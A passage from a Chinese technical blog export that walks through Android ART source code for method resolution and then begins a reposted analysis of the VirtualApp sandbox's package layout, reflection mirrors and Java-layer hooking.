LOG(FATAL) &lt;&lt; &quot;Unexpected call into trampoline: &quot; &lt;&lt; instr-&gt;DumpString(nullptr);</span><br><span class="line">        UNREACHABLE();</span><br><span class="line">    &#125;</span><br><span class="line">    called_method.dex_method_index = (is_range) ? instr-&gt;VRegB_3rc() : instr-&gt;VRegB_35c();</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    invoke_type = kStatic;</span><br><span class="line">    called_method.dex_file = called-&gt;GetDexFile();</span><br><span class="line">    called_method.dex_method_index = called-&gt;GetDexMethodIndex();</span><br><span class="line">  &#125;</span><br><span class="line">  uint32_t shorty_len;</span><br><span class="line">  const char* shorty =</span><br><span class="line">      called_method.dex_file-&gt;GetMethodShorty(</span><br><span class="line">          called_method.dex_file-&gt;GetMethodId(called_method.dex_method_index), &amp;shorty_len);</span><br><span class="line">  RememberForGcArgumentVisitor visitor(sp, invoke_type == kStatic, shorty, shorty_len, &amp;soa);</span><br><span class="line">  visitor.VisitArguments();</span><br><span class="line">  self-&gt;EndAssertNoThreadSuspension(old_cause);</span><br><span class="line">  const bool virtual_or_interface = invoke_type == kVirtual || invoke_type == kInterface;</span><br><span class="line">  // Resolve method filling in dex cache.</span><br><span class="line">  if (!called_method_known_on_entry) &#123;</span><br><span class="line">    StackHandleScope&lt;1&gt; hs(self);</span><br><span class="line">    mirror::Object* dummy = nullptr;</span><br><span class="line">    HandleWrapper&lt;mirror::Object&gt; h_receiver(</span><br><span class="line">        hs.NewHandleWrapper(virtual_or_interface ? &amp;receiver : &amp;dummy));</span><br><span class="line">    DCHECK_EQ(caller-&gt;GetDexFile(), called_method.dex_file);</span><br><span class="line">    called = linker-&gt;ResolveMethod(self, called_method.dex_method_index, caller, invoke_type);</span><br><span class="line">  &#125;</span><br><span class="line">  const void* code = nullptr;</span><br><span class="line">  if (LIKELY(!self-&gt;IsExceptionPending())) &#123;</span><br><span class="line">    // Incompatible class change should have been handled in resolve method.</span><br><span class="line">    CHECK(!called-&gt;CheckIncompatibleClassChange(invoke_type))</span><br><span class="line">        &lt;&lt; PrettyMethod(called) &lt;&lt; &quot; &quot; &lt;&lt; invoke_type;</span><br><span class="line">    if (virtual_or_interface) &#123;</span><br><span class="line">      // Refine called method based on receiver.</span><br><span class="line">      CHECK(receiver != nullptr) &lt;&lt; invoke_type;</span><br><span class="line"> </span><br><span class="line">      ArtMethod* orig_called = called;</span><br><span class="line">      if (invoke_type == kVirtual) &#123;</span><br><span class="line">        called = receiver-&gt;GetClass()-&gt;FindVirtualMethodForVirtual(called, sizeof(void*));</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        called = receiver-&gt;GetClass()-&gt;FindVirtualMethodForInterface(called, sizeof(void*));</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      CHECK(called != nullptr) &lt;&lt; PrettyMethod(orig_called) &lt;&lt; &quot; &quot;</span><br><span class="line">                               &lt;&lt; PrettyTypeOf(receiver) &lt;&lt; &quot; &quot;</span><br><span class="line">                               &lt;&lt; invoke_type &lt;&lt; &quot; &quot; &lt;&lt; orig_called-&gt;GetVtableIndex();</span><br><span class="line"> </span><br><span class="line">      // We came here because of sharpening. Ensure the dex cache is up-to-date on the method index</span><br><span class="line">      // of the sharpened method avoiding dirtying the dex cache if possible.</span><br><span class="line">      // Note, called_method.dex_method_index references the dex method before the</span><br><span class="line">      // FindVirtualMethodFor... This is ok for FindDexMethodIndexInOtherDexFile that only cares</span><br><span class="line">      // about the name and signature.</span><br><span class="line">      uint32_t update_dex_cache_method_index = called-&gt;GetDexMethodIndex();</span><br><span class="line">      if (!called-&gt;HasSameDexCacheResolvedMethods(caller)) &#123;</span><br><span class="line">        // Calling from one dex file to another, need to compute the method index appropriate to</span><br><span class="line">        // the caller&#x27;s dex file. Since we get here only if the original called was a runtime</span><br><span class="line">        // method, we&#x27;ve got the correct dex_file and a dex_method_idx from above.</span><br><span class="line">        DCHECK(!called_method_known_on_entry);</span><br><span class="line">        DCHECK_EQ(caller-&gt;GetDexFile(), called_method.dex_file);</span><br><span class="line">        const DexFile* caller_dex_file = called_method.dex_file;</span><br><span class="line">        uint32_t caller_method_name_and_sig_index = called_method.dex_method_index;</span><br><span class="line">        update_dex_cache_method_index =</span><br><span class="line">            called-&gt;FindDexMethodIndexInOtherDexFile(*caller_dex_file,</span><br><span class="line">                                                     caller_method_name_and_sig_index);</span><br><span class="line">      &#125;</span><br><span class="line">      if ((update_dex_cache_method_index != DexFile::kDexNoIndex) &amp;&amp;</span><br><span class="line">          (caller-&gt;GetDexCacheResolvedMethod(</span><br><span class="line">              update_dex_cache_method_index, sizeof(void*)) != called)) &#123;</span><br><span class="line">        caller-&gt;SetDexCacheResolvedMethod(update_dex_cache_method_index, called, sizeof(void*));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; else if (invoke_type == kStatic) &#123;</span><br><span class="line">      const auto called_dex_method_idx = called-&gt;GetDexMethodIndex();</span><br><span class="line">      // For static invokes, we may dispatch to the static method in the superclass but resolve</span><br><span class="line">      // using the subclass. To prevent getting slow paths on each invoke, we force set the</span><br><span class="line">      // resolved method for the super class dex method index if we are in the same dex file.</span><br><span class="line">      // b/19175856</span><br><span class="line">      if (called-&gt;GetDexFile() == called_method.dex_file &amp;&amp;</span><br><span class="line">          called_method.dex_method_index != called_dex_method_idx) &#123;</span><br><span class="line">        called-&gt;GetDexCache()-&gt;SetResolvedMethod(called_dex_method_idx, called, sizeof(void*));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    // Ensure that the called method&#x27;s class is initialized.</span><br><span class="line">    StackHandleScope&lt;1&gt; hs(soa.Self());</span><br><span class="line">    Handle&lt;mirror::Class&gt; called_class(hs.NewHandle(called-&gt;GetDeclaringClass()));</span><br><span class="line">    linker-&gt;EnsureInitialized(soa.Self(), called_class, true, true);</span><br><span class="line">    if (LIKELY(called_class-&gt;IsInitialized())) &#123;</span><br><span class="line">      if (UNLIKELY(Dbg::IsForcedInterpreterNeededForResolution(self, called))) &#123;</span><br><span class="line">        // If we are single-stepping or the called method is deoptimized (by a</span><br><span class="line">        // breakpoint, for example), then we have to execute the called method</span><br><span class="line">        // with the interpreter.</span><br><span class="line">        code = GetQuickToInterpreterBridge();</span><br><span class="line">      &#125; else if (UNLIKELY(Dbg::IsForcedInstrumentationNeededForResolution(self, caller))) &#123;</span><br><span class="line">        // If the caller is deoptimized (by a breakpoint, for example), we have to</span><br><span class="line">        // continue its execution with interpreter when returning from the called</span><br><span class="line">        // method. Because we do not want to execute the called method with the</span><br><span class="line">        // interpreter, we wrap its execution into the instrumentation stubs.</span><br><span class="line">        // When the called method returns, it will execute the instrumentation</span><br><span class="line">        // exit hook that will determine the need of the interpreter with a call</span><br><span class="line">        // to Dbg::IsForcedInterpreterNeededForUpcall and deoptimize the stack if</span><br><span class="line">        // it is needed.</span><br><span class="line">        code = GetQuickInstrumentationEntryPoint();</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        code = called-&gt;GetEntryPointFromQuickCompiledCode();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; else if (called_class-&gt;IsInitializing()) &#123;</span><br><span class="line">      if (UNLIKELY(Dbg::IsForcedInterpreterNeededForResolution(self, called))) &#123;</span><br><span class="line">        // If we are single-stepping or the called method is deoptimized (by a</span><br><span class="line">        // breakpoint, for example), then we have to execute the called method</span><br><span class="line">        // with the interpreter.</span><br><span class="line">        code = GetQuickToInterpreterBridge();</span><br><span class="line">      &#125; else if (invoke_type == kStatic) &#123;</span><br><span class="line">        // Class is still initializing, go to oat and grab code (trampoline must be left in place</span><br><span class="line">        // until class is initialized to stop races between threads).</span><br><span class="line">        code = linker-&gt;GetQuickOatCodeFor(called);</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        // No trampoline for non-static methods.</span><br><span class="line">        code = called-&gt;GetEntryPointFromQuickCompiledCode();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      DCHECK(called_class-&gt;IsErroneous());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  CHECK_EQ(code == nullptr, self-&gt;IsExceptionPending());</span><br><span class="line">  // Fixup any locally saved objects may have moved during a GC.</span><br><span class="line">  visitor.FixupReferences();</span><br><span class="line">  // Place called method in callee-save frame to be placed as first argument to quick method.</span><br><span class="line">  *sp = called;</span><br><span class="line"> </span><br><span class="line">  return code;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码可知，找到当前 <code>ArtMethod</code> 的流程大致的逻辑就是，根据 <code>caller</code> 函数 <code>ArtMethod</code> 的 <code>dex</code> 代码，可以找到这个 <code>ArtMethod</code> 的函数调用类型（<code>INVOKE_DIRECT, INVOKE_STATIC, INVOKE_SUPER, INVOKE_VIRTUAL etc</code>.），不同的类型查找的方式不一样，比如 <code>Virtual Method</code> 要从虚表里找，<code>Super Method</code> 要从父类的 <code>Method</code> 里去找，找到之后调用 <code>ClassLinker</code> 的 <code>ResolveMethod</code> 来解析，解析出来的 <code>ArtMethod</code> 的就是上面 <code>LinkCode</code> 过的 <code>ArtMethod</code> 。<br>下面就是 <code>ResolveMethod</code> 函数的实现， <code>Calss</code> 查找到 <code>Method</code> ，之后在赋值到 <code>DexCache</code> 里，这样下次再执行就能直接找到 <code>Resolved Method</code> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ArtMethod* ClassLinker::ResolveMethod(const DexFile&amp; dex_file, uint32_t method_idx,</span><br><span class="line">                                      Handle&lt;mirror::DexCache&gt; dex_cache,</span><br><span class="line">                                      Handle&lt;mirror::ClassLoader&gt; class_loader,</span><br><span class="line">                                      ArtMethod* referrer, InvokeType type) &#123;</span><br><span class="line">  DCHECK(dex_cache.Get() != nullptr);</span><br><span class="line">  // Check for hit in the dex cache.</span><br><span class="line">  ArtMethod* resolved = dex_cache-&gt;GetResolvedMethod(method_idx, image_pointer_size_);</span><br><span class="line">  if (resolved != nullptr &amp;&amp; !resolved-&gt;IsRuntimeMethod()) &#123;</span><br><span class="line">    DCHECK(resolved-&gt;GetDeclaringClassUnchecked() != nullptr) &lt;&lt; resolved-&gt;GetDexMethodIndex();</span><br><span class="line">    return resolved;</span><br><span class="line">  &#125;</span><br><span class="line">  // Fail, get the declaring class.</span><br><span class="line">  const DexFile::MethodId&amp; method_id = dex_file.GetMethodId(method_idx);</span><br><span class="line">  mirror::Class* klass = ResolveType(dex_file, method_id.class_idx_, dex_cache, class_loader);</span><br><span class="line">  if (klass == nullptr) &#123;</span><br><span class="line">    DCHECK(Thread::Current()-&gt;IsExceptionPending());</span><br><span class="line">    return nullptr;</span><br><span class="line">  &#125;</span><br><span class="line">  // Scan using method_idx, this saves string compares but will only hit for matching dex</span><br><span class="line">  // caches/files.</span><br><span class="line">  switch (type) &#123;</span><br><span class="line">    case kDirect:  // Fall-through.</span><br><span class="line">    case kStatic:</span><br><span class="line">      resolved = klass-&gt;FindDirectMethod(dex_cache.Get(), method_idx, image_pointer_size_);</span><br><span class="line">      DCHECK(resolved == nullptr || resolved-&gt;GetDeclaringClassUnchecked() != nullptr);</span><br><span class="line">      break;</span><br><span class="line">    case kInterface:</span><br><span class="line">      resolved = klass-&gt;FindInterfaceMethod(dex_cache.Get(), method_idx, image_pointer_size_);</span><br><span class="line">      DCHECK(resolved == nullptr || resolved-&gt;GetDeclaringClass()-&gt;IsInterface());</span><br><span class="line">      break;</span><br><span class="line">    case kSuper:  // Fall-through.</span><br><span class="line">    case kVirtual:</span><br><span class="line">      resolved = klass-&gt;FindVirtualMethod(dex_cache.Get(), method_idx, image_pointer_size_);</span><br><span class="line">      break;</span><br><span class="line">    default:</span><br><span class="line">      LOG(FATAL) &lt;&lt; &quot;Unreachable - invocation type: &quot; &lt;&lt; type;</span><br><span class="line">      UNREACHABLE();</span><br><span class="line">  &#125;</span><br><span class="line">  if (resolved == nullptr) &#123;</span><br><span class="line">    // Search by name, which works across dex files.</span><br><span class="line">    const char* name = dex_file.StringDataByIdx(method_id.name_idx_);</span><br><span class="line">    const Signature signature = dex_file.GetMethodSignature(method_id);</span><br><span class="line">    switch (type) &#123;</span><br><span class="line">      case kDirect:  // Fall-through.</span><br><span class="line">      case kStatic:</span><br><span class="line">        resolved = klass-&gt;FindDirectMethod(name, signature, image_pointer_size_);</span><br><span class="line">        DCHECK(resolved == nullptr || resolved-&gt;GetDeclaringClassUnchecked() != nullptr);</span><br><span class="line">        break;</span><br><span class="line">      case kInterface:</span><br><span class="line">        resolved = klass-&gt;FindInterfaceMethod(name, signature, image_pointer_size_);</span><br><span class="line">        DCHECK(resolved == nullptr || resolved-&gt;GetDeclaringClass()-&gt;IsInterface());</span><br><span class="line">        break;</span><br><span class="line">      case kSuper:  // Fall-through.</span><br><span class="line">      case kVirtual:</span><br><span class="line">        resolved = klass-&gt;FindVirtualMethod(name, signature, image_pointer_size_);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  // If we found a method, check for incompatible class changes.</span><br><span class="line">  if (LIKELY(resolved != nullptr &amp;&amp; !resolved-&gt;CheckIncompatibleClassChange(type))) &#123;</span><br><span class="line">    // Be a good citizen and update the dex cache to speed subsequent calls.</span><br><span class="line">    dex_cache-&gt;SetResolvedMethod(method_idx, resolved, image_pointer_size_);</span><br><span class="line">    return resolved;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    // If we had a method, it&#x27;s an incompatible-class-change error.</span><br><span class="line">    if (resolved != nullptr) &#123;</span><br><span class="line">      ThrowIncompatibleClassChangeError(type, resolved-&gt;GetInvokeType(), resolved, referrer);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      // We failed to find the method which means either an access error, an incompatible class</span><br><span class="line">      // change, or no such method. First try to find the method among direct and virtual methods.</span><br><span class="line">      const char* name = dex_file.StringDataByIdx(method_id.name_idx_);</span><br><span class="line">      const Signature signature = dex_file.GetMethodSignature(method_id);</span><br><span class="line">      switch (type) &#123;</span><br><span class="line">        case kDirect:</span><br><span class="line">        case kStatic:</span><br><span class="line">          resolved = klass-&gt;FindVirtualMethod(name, signature, image_pointer_size_);</span><br><span class="line">          // Note: kDirect and kStatic are also mutually exclusive, but in that case we would</span><br><span class="line">          //       have had a resolved method before, which triggers the &quot;true&quot; branch above.</span><br><span class="line">          break;</span><br><span class="line">        case kInterface:</span><br><span class="line">        case kVirtual:</span><br><span class="line">        case kSuper:</span><br><span class="line">          resolved = klass-&gt;FindDirectMethod(name, signature, image_pointer_size_);</span><br><span class="line">          break;</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      // If we found something, check that it can be accessed by the referrer.</span><br><span class="line">      bool exception_generated = false;</span><br><span class="line">      if (resolved != nullptr &amp;&amp; referrer != nullptr) &#123;</span><br><span class="line">        mirror::Class* methods_class = resolved-&gt;GetDeclaringClass();</span><br><span class="line">        mirror::Class* referring_class = referrer-&gt;GetDeclaringClass();</span><br><span class="line">        if (!referring_class-&gt;CanAccess(methods_class)) &#123;</span><br><span class="line">          ThrowIllegalAccessErrorClassForMethodDispatch(referring_class, methods_class, resolved,</span><br><span class="line">                                                        type);</span><br><span class="line">          exception_generated = true;</span><br><span class="line">        &#125; else if (!referring_class-&gt;CanAccessMember(methods_class, resolved-&gt;GetAccessFlags())) &#123;</span><br><span class="line">          ThrowIllegalAccessErrorMethod(referring_class, resolved);</span><br><span class="line">          exception_generated = true;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      if (!exception_generated) &#123;</span><br><span class="line">        // Otherwise, throw an IncompatibleClassChangeError if we found something, and check</span><br><span class="line">        // interface methods and throw if we find the method there. If we find nothing, throw a</span><br><span class="line">        // NoSuchMethodError.</span><br><span class="line">        switch (type) &#123;</span><br><span class="line">          case kDirect:</span><br><span class="line">          case kStatic:</span><br><span class="line">            if (resolved != nullptr) &#123;</span><br><span class="line">              ThrowIncompatibleClassChangeError(type, kVirtual, resolved, referrer);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">              resolved = klass-&gt;FindInterfaceMethod(name, signature, image_pointer_size_);</span><br><span class="line">              if (resolved != nullptr) &#123;</span><br><span class="line">                ThrowIncompatibleClassChangeError(type, kInterface, resolved, referrer);</span><br><span class="line">              &#125; else &#123;</span><br><span class="line">                ThrowNoSuchMethodError(type, klass, name, signature);</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            break;</span><br><span class="line">          case kInterface:</span><br><span class="line">            if (resolved != nullptr) &#123;</span><br><span class="line">              ThrowIncompatibleClassChangeError(type, kDirect, resolved, referrer);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">              resolved = klass-&gt;FindVirtualMethod(name, signature, image_pointer_size_);</span><br><span class="line">              if (resolved != nullptr) &#123;</span><br><span class="line">                ThrowIncompatibleClassChangeError(type, kVirtual, resolved, referrer);</span><br><span class="line">              &#125; else &#123;</span><br><span class="line">                ThrowNoSuchMethodError(type, klass, name, signature);</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            break;</span><br><span class="line">          case kSuper:</span><br><span class="line">            if (resolved != nullptr) &#123;</span><br><span class="line">              ThrowIncompatibleClassChangeError(type, kDirect, resolved, referrer);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">              ThrowNoSuchMethodError(type, klass, name, signature);</span><br><span class="line">            &#125;</span><br><span class="line">            break;</span><br><span class="line">          case kVirtual:</span><br><span class="line">            if (resolved != nullptr) &#123;</span><br><span class="line">              ThrowIncompatibleClassChangeError(type, kDirect, resolved, referrer);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">              resolved = klass-&gt;FindInterfaceMethod(name, signature, image_pointer_size_);</span><br><span class="line">              if (resolved != nullptr) &#123;</span><br><span class="line">                ThrowIncompatibleClassChangeError(type, kInterface, resolved, referrer);</span><br><span class="line">              &#125; else &#123;</span><br><span class="line">                ThrowNoSuchMethodError(type, klass, name, signature);</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Thread::Current()-&gt;AssertPendingException();</span><br><span class="line">    return nullptr;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>至此，Art Method 的执行机制就算介绍完了，我们对整个函数执行机制都有个全局的概念了。</p>
<p>参考</p>
<blockquote>
<p><a href="https://blog.csdn.net/threepigs/article/details/52884904">https://blog.csdn.net/threepigs/article/details/52884904</a></p>
<p><a href="https://www.jianshu.com/p/2ff1b63f686b">https://www.jianshu.com/p/2ff1b63f686b</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Android源码</category>
      </categories>
      <tags>
        <tag>Android源码阅读</tag>
      </tags>
  </entry>
  <entry>
    <title>Android 双开沙箱 VirtualApp 源码分析（一）</title>
    <url>/2020/08/03/Android-%E5%8F%8C%E5%BC%80%E6%B2%99%E7%AE%B1-VirtualApp-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<blockquote>
<p>转载 : <a href="https://blog.csdn.net/ganyao939543405/article/details/76146760">https://blog.csdn.net/ganyao939543405/article/details/76146760</a></p>
</blockquote>
<!-- TOC -->

<ul>
<li><a href="#%E5%8C%85%E7%BB%93%E6%9E%84">包结构</a><ul>
<li><a href="#androidcontent">android.content</a></li>
<li><a href="#comlodyvirtual">com.lody.virtual</a><ul>
<li><a href="#client">client</a></li>
<li><a href="#hook">HOOK</a></li>
<li><a href="#ipc">IPC</a></li>
<li><a href="#stub">Stub</a></li>
<li><a href="#remote">remote</a></li>
<li><a href="#server">server</a></li>
</ul>
</li>
<li><a href="#mirror">mirror</a></li>
</ul>
</li>
<li><a href="#%E4%B8%80%E4%BA%9B%E5%9F%BA%E7%A1%80%E6%8E%AA%E6%96%BD%E7%9A%84%E5%B0%81%E8%A3%85">一些基础措施的封装</a><ul>
<li><a href="#mirror-framework-%E5%B1%82%E9%95%9C%E5%83%8F">Mirror framework 层镜像</a><ul>
<li><a href="#%E6%88%90%E5%91%98%E5%8F%98%E9%87%8F-field-%E6%98%A0%E5%B0%84">成员变量 Field 映射</a></li>
<li><a href="#method-%E6%98%A0%E5%B0%84">Method 映射</a></li>
</ul>
</li>
<li><a href="#java-%E5%B1%82-hook">Java 层 Hook</a><ul>
<li><a href="#methodproxy">MethodProxy</a></li>
<li><a href="#methodproxies">MethodProxies</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E8%BF%90%E8%A1%8C%E6%97%B6%E7%BB%93%E6%9E%84">运行时结构</a><ul>
<li><a href="#%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%94%9F%E7%9A%84-framework-%E8%BF%90%E4%BD%9C%E6%96%B9%E5%BC%8F">系统原生的 framework 运作方式</a></li>
<li><a href="#va-%E7%8E%AF%E5%A2%83%E4%B8%8B-framework-%E8%BF%90%E4%BD%9C%E6%96%B9%E5%BC%8F">VA 环境下 framework 运作方式</a></li>
</ul>
</li>
</ul>
<!-- /TOC -->
<p>最近发现了一个非常好的开源项目，基本实现了一个 Android 上的沙箱环境，不过应用场景最多的还是应用双开。</p>
<ul>
<li>VA github: <a href="https://github.com/asLody/VirtualApp">https://github.com/asLody/VirtualApp</a> </li>
<li>VA 的源码注释: <a href="https://github.com/ganyao114/VA_Doc">https://github.com/ganyao114/VA_Doc</a></li>
</ul>
<p>本文主要是分析一下项目的整体结构。</p>
<h1 id="包结构"><a href="#包结构" class="headerlink" title="包结构"></a>包结构</h1><img src="/2020/08/03/Android-%E5%8F%8C%E5%BC%80%E6%B2%99%E7%AE%B1-VirtualApp-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89/2020-08-03-17-09-11.png" class="">

<h2 id="android-content"><a href="#android-content" class="headerlink" title="android.content"></a>android.content</h2><p>主要是 <code>PackageParser</code>,该类型覆盖了系统的隐藏类 <code>android.content.pm.PackageParser</code></p>
<h2 id="com-lody-virtual"><a href="#com-lody-virtual" class="headerlink" title="com.lody.virtual"></a>com.lody.virtual</h2><p>这里就是框架的主体代码了</p>
<h3 id="client"><a href="#client" class="headerlink" title="client"></a>client</h3><p>运行在客户端的代码，指加载到 <code>VA</code> 中的子程序在被 <code>VA</code> 代理(hook)之后,所运行的代码</p>
<h3 id="HOOK"><a href="#HOOK" class="headerlink" title="HOOK"></a>HOOK</h3><p>hook java 层函数的一些代码</p>
<h3 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h3><p>伪造的一些 <code>framework</code> 层的 <code>IPC</code> 服务类，诸如 <code>ActivityManager</code>, <code>ServiceManager</code> 等等，使用 <code>VXXXXX</code> 命名。<code>hook</code> 之后，子程序就会运行到这里而不是原来真正的系统 <code>framework</code> 代码。</p>
<h3 id="Stub"><a href="#Stub" class="headerlink" title="Stub"></a>Stub</h3><p>系统四大组件的插桩，如提前注册在 <code>Menifest</code> 里的几十个 <code>StubActivity</code> 。</p>
<h3 id="remote"><a href="#remote" class="headerlink" title="remote"></a>remote</h3><p>一些可序列化 <code>Model</code> ，继承于 <code>Parcelable</code> 。  </p>
<h3 id="server"><a href="#server" class="headerlink" title="server"></a>server</h3><p><code>server</code> 端代码， <code>VA</code> 伪造了一套 <code>framework</code> 层系统 <code>service</code> 的代码，他在一个独立的服务中记录管理组件的各种 <code>Recorder</code> ，其逻辑其实与系统原生的相近，通过 <code>Binder</code> 与 <code>client</code> 端的 <code>ipc</code> 包中的 <code>VXXXXManager</code> 通讯。诸如 <code>AMS(VAMS)</code> 、 <code>PMS(VPMS)</code>。</p>
<h2 id="mirror"><a href="#mirror" class="headerlink" title="mirror"></a>mirror</h2><p>系统 <code>framework</code> 的镜像，实现了与 <code>framework</code> 层相对应的结构，封装了反射获取系统隐藏字段和方法的，便于直接调用获取或者赋值以及调用方法。</p>
<h1 id="一些基础措施的封装"><a href="#一些基础措施的封装" class="headerlink" title="一些基础措施的封装"></a>一些基础措施的封装</h1><h2 id="Mirror-framework-层镜像"><a href="#Mirror-framework-层镜像" class="headerlink" title="Mirror framework 层镜像"></a>Mirror framework 层镜像</h2><h3 id="成员变量-Field-映射"><a href="#成员变量-Field-映射" class="headerlink" title="成员变量 Field 映射"></a>成员变量 Field 映射</h3><p>根据成员变量类型，映射类型分为几个基本数据类型和对象引用类型。下面就以对象引用类型为例，其他类型类似。</p>
<p>类型 <code>RefObject</code> 代表映射 <code>framework</code> 层同名的泛型类型成员变量。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Field 映射</span><br><span class="line">@SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">public class RefObject&lt;T&gt; &#123;</span><br><span class="line"></span><br><span class="line">    // framework 层对应的 Field</span><br><span class="line">    private Field field;</span><br><span class="line"></span><br><span class="line">    public RefObject(Class&lt;?&gt; cls, Field field) throws NoSuchFieldException &#123;</span><br><span class="line">        // 获取 framework 中同名字段的 field</span><br><span class="line">        this.field = cls.getDeclaredField(field.getName());</span><br><span class="line">        this.field.setAccessible(true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 获取变量值</span><br><span class="line">    public T get(Object object) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            return (T) this.field.get(object);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    // 赋值</span><br><span class="line">    public void set(Object obj, T value) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            this.field.set(obj, value);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            //Ignore</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以 <code>framework</code> 层中隐藏类 <code>LoadedApk</code> 来说：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class LoadedApk &#123;</span><br><span class="line">    public static Class Class = RefClass.load(LoadedApk.class, &quot;android.app.LoadedApk&quot;);</span><br><span class="line">    public static RefObject&lt;ApplicationInfo&gt; mApplicationInfo;</span><br><span class="line">    @MethodParams(&#123;boolean.class, Instrumentation.class&#125;)</span><br><span class="line">    public static RefMethod&lt;Application&gt; makeApplication;</span><br></pre></td></tr></table></figure>

<p><code>mApplicationInfo</code> 就是 <code>LoadedApk</code> 中私有字段 <code>ApplicationInfo</code> 类型的同名映射。</p>
<p>当你引用 <code>LoadedApk Mirror</code> 类时，类加载器加载该类并执行静态成员的初始化 <code>RefClass.load(LoadedApk.class, “android.app.LoadedApk”)</code> ， <code>LoadedApk Mirror</code> 类中的同名字段将被反射赋值。</p>
<p>下面看一下 <code>RefClass.load()</code> 函数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static Class load(Class mappingClass, Class&lt;?&gt; realClass) &#123;</span><br><span class="line">    // 获取 Mirror 类的所有字段</span><br><span class="line">    Field[] fields = mappingClass.getDeclaredFields();</span><br><span class="line">    for (Field field : fields) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            // 必须是 static 变量</span><br><span class="line">            if (Modifier.isStatic(field.getModifiers())) &#123;</span><br><span class="line">                // 从预设的 Map 中找到 RefXXXX 的构造器</span><br><span class="line">                Constructor&lt;?&gt; constructor = REF_TYPES.get(field.getType());</span><br><span class="line">                if (constructor != null) &#123;</span><br><span class="line">                    // 这里首先利用构造函数获取framework层真正的字段，然后赋值 LoadedApk 的静态字段，一遍后续调用 get 和 set</span><br><span class="line">                    field.set(null, constructor.newInstance(realClass, field));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        catch (Exception e) &#123;</span><br><span class="line">            // Ignore</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return realClass;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>后续再进行调用的话，使用 <code>LoadedApk.mApplicationInfo.get(instance)</code> 、 <code>LoadedApk.mApplicationInfo.set(instance)</code> 就相当于直接调用 <code>framework</code> 层的 <code>LoadedApk.mApplicationInfo</code> 字段了。</p>
<h3 id="Method-映射"><a href="#Method-映射" class="headerlink" title="Method 映射"></a>Method 映射</h3><p>其实与 <code>Field</code> 类似，只是 <code>Field</code> 主要是一个 <code>call</code> 即调用方法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@MethodParams(&#123;File.class, int.class&#125;)</span><br><span class="line">public static RefMethod&lt;PackageParser.Package&gt; parsePackage;</span><br></pre></td></tr></table></figure>

<p>表现在 <code>Mirror</code> 类型中也是一个字段，不过要在字段上边加上注解以标注参数类型。</p>
<p>当然还有一种情况，参数类型也是隐藏的，则要使用全限定名表示</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@MethodReflectParams(&#123;&quot;android.content.pm.PackageParser$Package&quot;, &quot;int&quot;&#125;)</span><br><span class="line">public static RefMethod&lt;Void&gt; collectCertificates;</span><br></pre></td></tr></table></figure>

<h2 id="Java-层-Hook"><a href="#Java-层-Hook" class="headerlink" title="Java 层 Hook"></a>Java 层 Hook</h2><p>位于 <code>com.lody.virtual.client.hook</code></p>
<p><code>Java</code> 层使用了 <code>Java</code> 自带的动态代理</p>
<h3 id="MethodProxy"><a href="#MethodProxy" class="headerlink" title="MethodProxy"></a>MethodProxy</h3><p><code>Hook</code> 点的代理接口，动态代理中的 <code>call</code> 。</p>
<p>重要的是这三个方法：</p>
